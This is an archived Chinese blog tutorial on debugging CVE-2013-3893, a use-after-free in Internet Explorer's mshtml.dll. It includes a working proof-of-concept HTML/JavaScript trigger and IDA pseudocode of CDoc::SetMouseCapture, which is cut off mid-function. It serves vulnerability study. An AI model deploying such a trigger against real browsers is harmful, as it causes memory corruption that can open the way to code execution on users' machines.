# IE 漏洞调试之 CVE-2013-3893 - milantgh - 博客园

> 原文：[`www.cnblogs.com/milantgh/p/4182982.html`](https://www.cnblogs.com/milantgh/p/4182982.html)

前言

Windows 平台的漏洞挖掘和安全研究中，IE 始终是绕不开的话题。IE 漏洞就跟 adobe 系列一样经典，是学习 exploit、shellcode 的绝佳途径。

在 IE 漏洞中，UAF 即 Use-After-Free 是最为经典的一类。UAF 可以这样简单理解：A 先后调用 B、C、D 三个子函数，B 会把 A 的某个资源释放掉；而 D 由于判断不严谨即使在 B 把 A 的资源释放后依然去引用它，比如某个指针，这时 D 引用了很危险的悬空指针；C 是个什么角色呢？我们可以通过 B 分配数据。所以利用方法来了：构造奇葩的数据，让 A 调用 B，B 把 A 的某个指针释放掉；接着执行 C，C 赶紧分配内存，企图使用刚才释放掉的内存，同时我们可以控制这个内存；最后 D 被调用，由于检查不严格调用了已经释放掉的某指针，而该指针实际上已经被我们重用并且扭曲。漏洞被利用。

但是学习 IE 的资料非常少，已知的大都是大牛们逆向 mshtml.dll 来的，辛辛苦苦得来的东西也不方便马上透露出来，所以自力更生是很重要的。我们希望了解 IE 运行机制，自己 fuzz 并找到有价值的漏洞。与此同时，能够调试已公布的漏洞，学习已有的 POC，也是很重要的能力。所以这里选择 CVE-2013-3893 这个经典的 UAF 来学习 IE 漏洞的调试。

工具

windbg、ida、各版本 IE 程序、xp/vista/win7/win8 虚拟机

windbg 用于动态调试；IDA 用于静态分析 mshtml.dll——实现 IE 解释器的 dll；各版本 IE 和 windows 是必不可少的。 

基础知识

出现一个新的漏洞，涉及到的解析过程我们并不一定分析过，所以分析漏洞的同时也是学习浏览器机制的好机会。比如 CVE-2013-3893 这个漏洞，我们需要了解 CTreeNode 和元素的关系以及几个关键的函数实现。具体的结合 POC 和调试过程分析。 

POC

```
<html> <script> function trigger() { Math.tan(3,4); var id_0 = document.createElement("sup"); var id_1 = document.createElement("audio"); Math.sin(0); document.body.appendChild(id_0); document.body.appendChild(id_1); Math.cos(0); id_1.applyElement(id_0); Math.tan(3,4); id_0.onlosecapture=function(e){ document.write(""); } Math.sin(0); 
    id_0[‘outerText’]=""; Math.cos(0); id_0.setCapture(); Math.tan(3,4); id_1.setCapture(); Math.sin(0); } window.onload = function() { trigger(); } </script> </html>
```

调试技巧

用 windbg 载入 IE 时设置 jscript!tan、jscript!sin、jscript!cos 断点，逐语句分析。也可以将 POC 页面设置为 IE 主页，便于直接载入。结合 IDA 对 mshtml.dll 分析相关函数。 

漏洞原理

id_1.setCapture 时，进入 CDoc::PumpMessage；获取 Element 的 TreeNode，调用 CDoc::ReleaseDetachedCaptures()；参数为 0 调用 CDos::SetMouseCapture，进入 CDos::ClearMouseCapture，调用 CElement::FireEvent，触发事件导致 id_0.onlosecapture 指定的 js 函数调用，document.write(“”)，该函数将所有对象释放 CBodyElement 的 CTreeNode 也被释放。然后返回 PumpMessage，CDos::HasContainerCapture 被调用，它引用了释放的 CTreeNode 对象。UAF 发生。看下面 IDA 静态分析的代码。

```
int __userpurge CDoc::SetMouseCapture<eax>(int a1<eax>, LPVOID lpMem, int a3, int a4, int a5, int a6, int a7) { int v7; // ebx@1 int flag; // edi@1 int result; // eax@3 int v10; // esi@9 int v11; // ecx@16 int v12; // eax@22 int v13; // ST14_4@28 char v14; // [sp+10h] [bp-98h]@21 int v15; // [sp+14h] [bp-94h]@21 int v16; // [sp+A4h] [bp-4h]@5 void *lpMema; // [sp+B0h] [bp+8h]@7 v7 = (int)lpMem; flag = a1; if ( *((_WORD *)lpMem + 938) & 0x1000 ) flag = 0; if ( flag ) { v16 = (*((_DWORD *)lpMem + 65) >> 2) - 1; result = v16; if ( v16 < 0 ) goto LABEL_33; v11 = *((_DWORD *)lpMem + 67) + 4 * v16; do { if ( *(_DWORD *)(*(_DWORD *)v11 + 8) == flag ) break; --result; v11 -= 4; } while ( result >=
```